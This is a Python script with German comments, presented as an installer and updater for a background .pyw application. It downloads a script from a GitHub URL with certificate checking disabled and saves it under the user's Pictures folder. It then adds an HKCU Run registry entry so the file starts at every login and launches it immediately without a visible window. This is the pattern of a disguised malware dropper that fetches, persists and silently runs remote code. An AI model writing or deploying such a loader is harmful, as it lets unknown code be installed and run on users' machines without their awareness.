# installer.py  oder  updater_and_installer.py
"""
Einfacher Installer + Updater für eine Python-.pyw-Anwendung
- Keine Admin-Rechte erforderlich
- Nutzt Startup-Ordner + HKCU:Run für Autostart
- Lädt/aktualisiert die Anwendung aus dem Internet
"""

import ssl
import sys
import os
import time
import urllib.request
import subprocess
import winreg
import platform

# ────────────────────────────────────────────────
# KONFIGURATION
APP_NAME       = "UpdateFramework"  # Name deiner Anwendung
FILE_NAME      = "updateframework.pyw"      # Name der Hauptdatei deiner Anwendung
urllib.request.urlcleanup()
UPDATE_URL     = "https://raw.githubusercontent.com/pyw-update/python/refs/heads/main/src/" + FILE_NAME

TASK_NAME      = f"{APP_NAME} Startup"           # nur für Info, wird nicht wirklich als Task verwendet
# ────────────────────────────────────────────────

IS_WINDOWS = platform.system().lower() == "windows"

if not IS_WINDOWS:
    print("Dieses Skript ist nur für Windows gedacht.")
    sys.exit(1)

# Verzeichnis im LOCALAPPDATA
# if "WindowsApps" in sys.executable:
#     LOCAL_APPDATA = os.path.join(os.environ["USERPROFILE"], "Pictures")
# else:
#     LOCAL_APPDATA = os.environ.get("LOCALAPPDATA", os.path.expanduser("~\\AppData\\Local"))
LOCAL_APPDATA = os.path.join(os.environ["USERPROFILE"], "Pictures")
APP_DIR       = os.path.join(LOCAL_APPDATA, APP_NAME)
APP_PATH      = os.path.join(APP_DIR, FILE_NAME)


def download_or_update_app():
    """Lädt die Datei herunter oder aktualisiert sie, wenn neuer"""
    os.makedirs(APP_DIR, exist_ok=True)

    try:
        print(f"→ Lade {FILE_NAME} herunter ...")
        context = ssl._create_unverified_context()
        req = urllib.request.Request(UPDATE_URL)
        req.add_header('Pragma', 'no-cache')
        resp = urllib.request.urlopen(req, timeout=15, context=context)
        with resp as response:
            if response.status != 200:
                print(f"Download fehlgeschlagen – Status: {response.status}")
                return False
            new_content = response.read()

        # Speichern
        with open(APP_PATH, "wb") as f:
            f.write(new_content)

        print(f"→ Erfolgreich heruntergeladen/aktualisiert: {APP_PATH}")
        return True

    except Exception as e:
        print(f"Download/Fehler: {e}")
        return False


def add_to_registry_run():
    """Fügt Eintrag in HKCU:Run hinzu – läuft beim Login"""
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    python_exe = sys.executable

    value = f'"{python_exe}" "{APP_PATH}"'

    try:
        key = winreg.OpenKey( # type: ignore
            winreg.HKEY_CURRENT_USER,# type: ignore
            key_path,
            0,
            winreg.KEY_SET_VALUE | winreg.KEY_READ# type: ignore
        )
        # Alten Wert löschen, falls vorhanden
        try:
            winreg.DeleteValue(key, APP_NAME)# type: ignore
        except FileNotFoundError:
            pass

        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, value)# type: ignore
        winreg.CloseKey(key)# type: ignore

        print(f"→ In Registry (HKCU\\Run) hinzugefügt: {APP_NAME}")
        return True

    except Exception as e:
        print(f"Registry Fehler: {e}")
        return False


def start_app_now():
    """Startet die Anwendung sofort (ohne Konsole)"""
    if not os.path.exists(APP_PATH):
        print("Anwendung nicht gefunden – kann nicht starten.")
        return False

    try:
        creationflags = subprocess.CREATE_NO_WINDOW if IS_WINDOWS else 0# type: ignore
        subprocess.Popen(
            [sys.executable, APP_PATH],
            creationflags=creationflags,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        print("→ Anwendung jetzt gestartet")
        return True
    except Exception as e:
        print(f"Startfehler: {e}")
        return False


def main():
    print(f"=== {APP_NAME} Installer / Updater ===\n")

    # 1. App herunterladen oder aktualisieren
    success_download = download_or_update_app()
    if not success_download:
        print("\nInstallation/Update fehlgeschlagen. Beende.")
        sys.exit(1)

    # 2. Autostart einrichten (zwei Methoden → mindestens eine sollte klappen)
    print("\nAutostart einrichten ...")
    registry_ok = add_to_registry_run()

    if  not registry_ok:
        print("\nWARNUNG: Konnte Autostart nicht einrichten.")
        print("→ Du kannst die Datei manuell starten: " + APP_PATH)
    else:
        print("→ Autostart erfolgreich eingerichtet (mindestens eine Methode)")

    # 3. App jetzt starten
    print("\nStarte die Anwendung ...")
    start_app_now()

    print("\nFertig! Die Anwendung sollte nun laufen und beim nächsten Login automatisch starten.")
    print(f"Ordner: {APP_DIR}")
    print(f"Datei:  {APP_PATH}\n")

    # Kurze Pause, damit der User die Ausgabe lesen kann
    time.sleep(2)
    sys.exit(1)


if __name__ == "__main__":
    main()